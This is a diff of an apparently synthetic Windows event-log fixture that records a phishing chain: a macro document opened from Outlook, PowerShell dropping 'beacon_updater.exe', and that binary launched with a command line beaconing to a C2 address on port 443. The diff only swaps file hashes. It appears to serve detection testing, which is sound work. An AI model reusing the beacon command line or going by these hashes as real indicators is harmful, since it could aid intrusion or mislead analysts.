@@ -270,7 +270,7 @@
       <Data Name="Image">C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE</Data>
       <Data Name="TargetFilename">C:\Users\jdoe\AppData\Local\Temp\02_weaponized_document.docm</Data>
       <Data Name="CreationUtcTime">2026-10-10 09:59:30.000</Data>
-      <Data Name="Hashes">MD5=9dcb1ede6a5f26fb3a1bc70dff7be710,SHA256=c972acd18359807689d608acbc1415e0147c8aeb5c0958d7fb2233e9ee65a5aa</Data>
+      <Data Name="Hashes">MD5=d4ce570e360fbf1d9ed1aab6c34ba179,SHA256=fe80980a86cda2850669dc6dde32b4614ed147a8665f89bbb1b15e5c6ee7e876</Data>
     </EventData>
   </Event>
 
@@ -289,7 +289,7 @@
       <Data Name="NewProcessName">C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE</Data>
       <Data Name="CommandLine">"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" "C:\Users\jdoe\AppData\Local\Temp\02_weaponized_document.docm"</Data>
       <Data Name="ParentProcessName">C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE</Data>
-      <Data Name="Hashes">MD5=9dcb1ede6a5f26fb3a1bc70dff7be710,SHA256=c972acd18359807689d608acbc1415e0147c8aeb5c0958d7fb2233e9ee65a5aa</Data>
+      <Data Name="Hashes">MD5=d4ce570e360fbf1d9ed1aab6c34ba179,SHA256=fe80980a86cda2850669dc6dde32b4614ed147a8665f89bbb1b15e5c6ee7e876</Data>
     </EventData>
   </Event>
 
@@ -325,7 +325,7 @@
       <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
       <Data Name="TargetFilename">C:\Users\jdoe\AppData\Local\Temp\beacon_updater.exe</Data>
       <Data Name="CreationUtcTime">2026-10-10 10:00:08.000</Data>
-      <Data Name="Hashes">MD5=a9c6e93aeba5c903c1a33d3c0976147a,SHA256=fbfd5b9863d0e6acf98c420c3d2e301a830f42e8fee7d94809ea9bffdf755972</Data>
+      <Data Name="Hashes">MD5=19bfd14436c2fb1cd8ee375055c6ebd7,SHA256=20bde17bc580f858a4bef2ab462744831a3e0164e79c064b266776ffa3c18b90</Data>
     </EventData>
   </Event>
 
@@ -344,7 +344,7 @@
       <Data Name="NewProcessName">C:\Users\jdoe\AppData\Local\Temp\beacon_updater.exe</Data>
       <Data Name="CommandLine">"C:\Users\jdoe\AppData\Local\Temp\beacon_updater.exe" -c2 185.220.101.45:443 -interval 5</Data>
       <Data Name="ParentProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
-      <Data Name="Hashes">MD5=a9c6e93aeba5c903c1a33d3c0976147a,SHA256=fbfd5b9863d0e6acf98c420c3d2e301a830f42e8fee7d94809ea9bffdf755972</Data>
+      <Data Name="Hashes">MD5=19bfd14436c2fb1cd8ee375055c6ebd7,SHA256=20bde17bc580f858a4bef2ab462744831a3e0164e79c064b266776ffa3c18b90</Data>
     </EventData>
   </Event>
 
